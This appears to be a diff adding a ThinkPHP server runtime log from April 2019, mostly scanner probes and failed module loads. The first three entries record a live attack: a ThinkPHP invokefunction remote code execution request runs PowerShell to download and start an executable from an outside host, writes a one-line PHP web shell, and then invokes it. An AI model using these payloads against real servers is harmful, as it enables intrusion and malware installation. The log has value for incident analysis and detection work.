@@ -1,0 +1,108 @@
+[ 2019-04-15T00:27:34+08:00 ] 47.93.206.107 /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/pqpaywfcamjurpm3072.exe');start%20C:/Windows/temp/pqpaywfcamjurpm3072.exe
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T00:27:34+08:00 ] 47.93.206.107 /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000200s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T00:27:34+08:00 ] 47.93.206.107 /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/pqpaywfcamjurpm3072.exe');start%20C:/Windows/temp/pqpaywfcamjurpm3072.exe
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000197s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T04:27:57+08:00 ] 64.246.165.140 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000229s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-04-15T05:00:03+08:00 ] 42.56.26.14 /mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B"train_date"%3A"20181231"%2C"purpose_codes"%3A"00"%2C"from_station"%3A"BJP"%2C"to_station"%3A"SHH"%2C"station_train_code"%3A""%2C"start_time_begin"%3A"0000"%2C"start_time_end"%3A"2400"%2C"train_headers"%3A"QB%23"%2C"train_flag"%3A""%2C"seat_type"%3A"0"%2C"seatBack_Type"%3A""%2C"ticket_num"%3A""%2C"dfpStr"%3A""%2C"baseDTO"%3A%7B"check_code"%3A"d38a201f2de926ce0686aedfdcf2de68"%2C"device_no"%3A"WtaHBzID7ZQDADJh05y5LLpd"%2C"mobile_no"%3A""%2C"os_type"%3A"a"%2C"time_str"%3A"20181030152947"%2C"version_no"%3A"4.1.9"%7D%7D%5D&ts=1540884587652&sign=37b8ebe6406579e4fb2ac8c9038eab37
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000240s ]
+ERR: 无法加载模块:Mgw
+
+[ 2019-04-15T05:00:03+08:00 ] 42.56.26.14 /mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B"train_date"%3A"20181231"%2C"purpose_codes"%3A"00"%2C"from_station"%3A"BJP"%2C"to_station"%3A"SHH"%2C"station_train_code"%3A""%2C"start_time_begin"%3A"0000"%2C"start_time_end"%3A"2400"%2C"train_headers"%3A"QB%23"%2C"train_flag"%3A""%2C"seat_type"%3A"0"%2C"seatBack_Type"%3A""%2C"ticket_num"%3A""%2C"dfpStr"%3A""%2C"baseDTO"%3A%7B"check_code"%3A"d38a201f2de926ce0686aedfdcf2de68"%2C"device_no"%3A"WtaHBzID7ZQDADJh05y5LLpd"%2C"mobile_no"%3A""%2C"os_type"%3A"a"%2C"time_str"%3A"20181030152947"%2C"version_no"%3A"4.1.9"%7D%7D%5D&ts=1540884587652&sign=37b8ebe6406579e4fb2ac8c9038eab37
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000203s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T07:42:24+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T16:11:59+08:00 ] 118.89.43.33 /phpmyadmin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-04-15T16:11:59+08:00 ] 118.89.43.33 /phpmyadmin/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-04-15T16:11:59+08:00 ] 118.89.43.33 /phpmyadmin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T16:11:59+08:00 ] 118.89.43.33 /phpmyadmin/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T16:15:19+08:00 ] 118.89.43.33 /phpmyadmin/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-04-15T16:15:19+08:00 ] 118.89.43.33 /phpmyadmin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-04-15T16:15:19+08:00 ] 118.89.43.33 /phpmyadmin/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T16:15:19+08:00 ] 118.89.43.33 /phpmyadmin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T17:03:42+08:00 ] 173.44.41.236 //phpmyadmin//
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-04-15T17:49:30+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000247s ]
+ERR: 无法加载模块:404
+
+[ 2019-04-15T18:18:45+08:00 ] 139.162.88.63 /echo.php?info=1234567890
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
+ERR: 无法加载模块:404
+
